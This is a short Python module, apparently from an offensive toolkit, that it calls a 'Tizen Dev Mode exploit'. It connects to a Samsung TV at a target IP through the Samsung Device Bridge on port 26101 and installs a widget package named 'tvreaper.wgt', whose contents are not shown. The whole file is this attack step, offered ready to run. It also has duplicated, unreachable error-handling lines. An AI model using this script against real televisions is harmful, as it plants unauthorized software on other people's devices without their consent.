#!/usr/bin/env python3
import subprocess
import sys
import os
import shutil
from core.utils import logger

def install(target_ip):
    logger.info(f"Attempting Tizen Dev Mode exploit on {target_ip}...")

    if shutil.which("sdb") is None:
        logger.error("Samsung Device Bridge (sdb) not found.")
        return False
        logger.error("Samsung Device Bridge (sdb) not found.")
        return False

    # 2. Connect to TV
    try:
        subprocess.run(["sdb", "connect", f"{target_ip}:26101"], timeout=10, capture_output=True)
    except subprocess.TimeoutExpired:
        logger.error("Connection timeout.")
        return False

    # 3. Install .wgt
    widget_path = "resources/tvreaper.wgt"
    if not os.path.exists(widget_path):
        logger.error(f"Widget file missing: {widget_path}")
        return False

    try:
        result = subprocess.run(["sdb", "install", widget_path], timeout=120, capture_output=True)
        if result.returncode == 0:
            logger.info("Widget installed.")
            return True
        else:
            logger.error(f"Install failed: {result.stderr.decode()}")
            return False
    except subprocess.TimeoutExpired:
        logger.error("Install timeout.")
        return False
